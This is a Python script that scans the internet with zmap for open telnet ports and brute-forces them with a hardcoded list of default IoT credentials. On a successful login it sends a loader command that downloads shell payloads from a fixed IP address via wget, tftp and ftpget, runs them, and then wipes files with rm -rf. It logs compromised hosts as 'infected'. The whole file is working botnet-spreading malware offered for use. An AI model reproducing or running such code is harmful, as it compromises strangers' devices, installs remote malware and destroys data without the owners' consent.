#!/usr/bin/python3
import threading
import sys, os, re, time, random, socket, select, subprocess

if len(sys.argv) < 3:
    print("Usage: python " + sys.argv[0] + " <threads> <output file>")
    sys.exit()

rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://152.42.212.230/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 152.42.212.230 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 152.42.212.230; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 152.42.212.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"

combo = [ 
    "root:root", "root:", "admin:admin", "telnet:telnet", "support:support", "user:user",
    "admin:", "admin:password", "root:vizxv", "root:admin", "root:xc3511", "root:888888",
    "root:xmhdipc", "root:default", "root:juantech", "root:123456", "root:54321", "root:12345",
    "root:pass", "ubnt:ubnt", "root:klv1234", "root:Zte521", "root:hi3518", "root:jvbzd",
    "root:anko", "root:zlxx.", "root:7ujMko0vizxv", "root:7ujMko0admin", "root:system", "root:ikwb",
    "root:dreambox", "root:user", "root:realtek", "root:00000000", "admin:1111111", "admin:1234",
    "admin:12345", "admin:54321", "admin:123456", "admin:7ujMko0admin", "admin:pass", "admin:meinsm",
    "admin:admin1234", "root:1111", "admin:smcadmin", "admin:1111", "root:666666", "root:password",
    "root:1234", "root:klv123", "Administrator:admin", "service:service", "supervisor:supervisor",
    "guest:guest", "guest:12345", "admin1:password", "administrator:1234", "666666:666666",
    "888888:888888", "tech:tech", "mother:fucker", "root:admin", "admin:root"
]

threads = int(sys.argv[1])
output_file = sys.argv[2]

def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            buf += tn.recv(1024).decode(errors='ignore')
        except:
            break
        time.sleep(0.1)
        if string in buf:
            return buf
    raise Exception('TIMEOUT!')

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        try:
            data = sock.recv(size)
            return data.decode(errors='ignore')
        except:
            return ""
    return ""

class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')

    def run(self):
        global fh
        for passwd in combo:
            username = passwd.split(":")[0] if "n/a:" not in passwd else ""
            password = passwd.split(":")[1] if ":n/a" not in passwd else ""

            try:
                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tn.settimeout(1)
                tn.connect((self.ip, 23))
            except:
                tn.close()
                break

            try:
                hoho = readUntil(tn, ":")
                if ":" in hoho:
                    tn.send((username + "\r\n").encode())
                    time.sleep(0.1)
                else:
                    tn.close()
                    return

                hoho = readUntil(tn, ":")
                if ":" in hoho:
                    tn.send((password + "\r\n").encode())
                    time.sleep(0.1)

                prompt = recvTimeout(tn, 40960)
                success = any(x in prompt for x in ['#', '$']) and not any(bad in prompt.lower() for bad in [
                    "nvalid", "ailed", "ncorrect", "enied", "error", "goodbye", "bad", "timeout", "##"
                ])

                if success:
                    print(f"\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m{username}\033[37m:\033[33m{password}\033[37m:\033[32m{self.ip}\033[37m")
                    fh.write(f"{self.ip}:23 {username}:{password}\n")
                    fh.flush()

                    tn.send(b"sh\r\n")
                    time.sleep(0.1)
                    tn.send(b"shell\r\n")
                    time.sleep(0.1)
                    tn.send(b"ls /\r\n")
                    time.sleep(1)

                    buf = ''
                    start_time = time.time()
                    while time.time() - start_time < 8:
                        buf += recvTimeout(tn, 40960)
                        time.sleep(0.1)
                        if "tmp" in buf and "unrecognized" not in buf:
                            tn.send((rekdevice + "\r\n").encode())
                            print(f"\033[32m[\033[31m+\033[32m] \033[33mINFECTED \033[31m-> \033[32m{username}\033[37m:\033[33m{password}\033[37m:\033[32m{self.ip}\033[37m")
                            with open("infected.txt", "a") as f:
                                f.write(f"{self.ip}:23 {username}:{password}\n")
                            time.sleep(10)
                            tn.close()
                            return
                    tn.close()
                    return
                else:
                    tn.close()
            except:
                tn.close()

def worker():
    while True:
        cmd = "zmap -p23 -N 10000 -f saddr -q --verbosity=0"
        process = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE)
        for line in iter(process.stdout.readline, b''):
            line = line.decode().strip()
            try:
                thread = router(line)
                thread.start()
            except:
                pass

global fh
fh = open(output_file, "a")

for l in range(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass

print("Started " + str(threads) + " scanner threads! Press enter to stop.")
input()
os.kill(os.getpid(), 9)
